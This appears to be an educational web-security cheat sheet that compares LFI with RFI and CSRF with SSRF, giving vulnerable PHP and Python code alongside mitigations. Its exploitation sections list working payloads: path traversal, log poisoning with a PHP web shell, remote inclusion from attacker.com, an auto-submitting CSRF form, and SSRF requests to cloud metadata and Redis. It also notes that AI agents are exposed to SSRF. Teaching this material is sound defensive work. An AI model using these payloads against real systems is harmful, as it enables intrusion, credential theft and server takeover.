*Written by Aryan Giri*

---

# Part 1: LFI vs RFI

## 🧠 Why It Occurs (Vulnerable Code)

### LFI Vulnerable PHP Code

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

👉 User controls file path → no validation → arbitrary file inclusion

### RFI Vulnerable PHP Code

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

(with `allow_url_include=On`)

👉 Same code, but now accepts remote URLs → instant RCE

---

## 🛡️ Mitigation

### LFI/RFI Fixes

* Use strict allowlist:

```php
$allowed = ['home','about'];
if(in_array($_GET['page'], $allowed)) {
  include($_GET['page'] . '.php');
}
```

* Disable remote inclusion:

```
allow_url_include = Off
```

* Use absolute paths (no user input)
* Sanitize input (`basename()`, realpath checks)
* Run app with least privilege

---

## 🔥 The Vuln

### LFI (Local File Inclusion)

Application includes files from local server filesystem.

### RFI (Remote File Inclusion)

Application includes files from external URLs.

---

## 🧠 Core Difference

| Type | Source       | Risk                            |
| ---- | ------------ | ------------------------------- |
| LFI  | Local files  | Info leak → RCE (with chaining) |
| RFI  | Remote files | Direct RCE                      |

---

## 💣 LFI Exploitation

### Basic Payload

```
?page=../../../../etc/passwd
```

### Advanced Payloads

#### Log Poisoning → RCE

```
User-Agent: <?php system($_GET['cmd']); ?>
```

Then:

```
?page=/var/log/apache2/access.log&cmd=id
```

#### PHP Wrapper

```
?page=php://filter/convert.base64-encode/resource=index.php
```

#### /proc/self/environ

```
?page=/proc/self/environ
```

---

## ⚡ RFI Exploitation

### Payload

```
?page=http://attacker.com/shell.txt
```

### Malicious File

```
<?php system($_GET['cmd']); ?>
```

---

## 💥 Impact

* LFI:

  * Sensitive file disclosure
  * Credential leaks
  * RCE via chaining

* RFI:

  * Direct remote code execution
  * Full server takeover

---

## ❌ When It Fails

* allow_url_include = Off (kills RFI)
* Input sanitization
* File path whitelisting

---

# Part 2: CSRF vs SSRF

## 🧠 Why It Occurs (Vulnerable Code)

### CSRF Vulnerable Backend (No Token)

```php
<?php
// change-password.php
session_start();
$new = $_POST['password'];
$user = $_SESSION['user'];

mysqli_query($conn, "UPDATE users SET password='$new' WHERE username='$user'");
?>
```

👉 No CSRF token → browser auto-sends cookies → attacker forces request

### SSRF Vulnerable Code

```python
import requests
url = request.GET['url']
requests.get(url)
```

👉 User controls URL → server makes request blindly

---

## 🛡️ Mitigation

### CSRF Fixes

* Use CSRF tokens (synchronizer token pattern)
* Set cookies:

```
SameSite=Strict
```

* Validate Origin/Referer headers

### SSRF Fixes

* Allowlist domains only
* Resolve DNS → validate IP (block internal ranges)
* Disable unnecessary protocols (gopher, file)
* Use outbound firewall rules

---

---

## 🔥 The Vuln

### CSRF (Cross-Site Request Forgery)

Forces a victim’s browser to send authenticated requests.

### SSRF (Server-Side Request Forgery)

Forces server to make requests on behalf of attacker.

---

## 🧠 Core Difference

| Type | Who sends request | Target            |
| ---- | ----------------- | ----------------- |
| CSRF | Victim browser    | Web app           |
| SSRF | Server            | Internal services |

---

## 💣 CSRF Exploitation

### Example

```
<form action="https://victim.com/change-password" method="POST">
<input type="hidden" name="password" value="hacked123">
</form>
<script>document.forms[0].submit()</script>
```

### Requirements

* Victim logged in
* No CSRF token or weak validation

---

## ⚡ SSRF Exploitation

### Basic Payload

```
http://127.0.0.1
```

### Cloud Metadata

```
http://169.254.169.254/latest/meta-data/
```

### Gopher (Redis example)

```
gopher://127.0.0.1:6379/_*1\r\n$4\r\nINFO\r\n
```

---

## 💥 Impact

### CSRF

* Account takeover (password/email change)
* Unauthorized transactions
* Actions as victim

### SSRF

* Internal network access
* Cloud credential theft
* RCE via internal services

---

## 🧠 Why They Exist

### CSRF

* Browsers auto-send cookies
* No request origin validation

### SSRF

* Server trusts user-supplied URLs
* No outbound request filtering

---

## ❌ When It Fails

### CSRF

* CSRF tokens
* SameSite cookies
* Origin/Referer validation

### SSRF

* IP filtering
* URL validation
* Network segmentation

---

# ⚔️ Real-World Chains

* LFI → Log Poisoning → RCE
* SSRF → Metadata → AWS Keys → Cloud takeover
* CSRF → Change email → Reset password → Account takeover

---

# 🧠 2026 Insight

* SSRF now appears in AI agents (tool fetching)
* LFI still alive in legacy PHP apps
* CSRF less common but still exists in APIs
* RFI rare but critical when found

---
